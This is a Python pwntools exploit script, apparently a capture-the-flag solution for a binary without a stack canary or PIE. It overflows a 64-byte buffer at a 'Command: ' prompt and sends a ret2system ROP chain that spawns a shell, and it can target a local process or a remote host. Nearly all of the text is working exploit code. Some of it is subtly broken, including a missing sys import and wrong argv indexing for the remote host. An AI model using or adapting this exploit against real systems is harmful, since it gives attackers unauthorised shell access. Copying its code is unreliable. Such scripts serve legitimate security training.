from pwn import *
from sys import argv
from os.path import isfile

target = sys.argv[1]
if not isfile(target):
  print(f'[!] {target}: not found or not a file.')
elf = context.binary = ELF(target, checksec=False)

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([target] + argv, gdbscript=gdbscript, *a, **kw)
  elif args.REMOTE:
    if len(argv) != 4:
      print(f'[!] host IP and port not supplied.')
      exit(1)
    return remote(argv[2], argv[3], *a, **kw)
  else:
    return process([target] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

##### settings #####

context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

##### template ends #####

#Arch:       amd64-64-little
#RELRO:      Partial RELRO
#Stack:      No canary found
#NX:         NX enabled
#PIE:        No PIE (0x400000)
#Stripped:   No

# ===========================================================
#          EXPLOIT GOES HERE
# ===========================================================
p = start()
f = open('payload', 'wb')
def sa(i,o):
  p.sendlineafter(i,o)
  f.write(o)

rop = ROP(elf)

payload = p64(rop.find_gadget(["ret"])[0])
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(next(elf.search(b'/bin/sh\x00')))
payload += p64(elf.sym['system'])

sa(b'Command: ', cyclic_gen().get(64 + 8) + payload)

p.interactive()
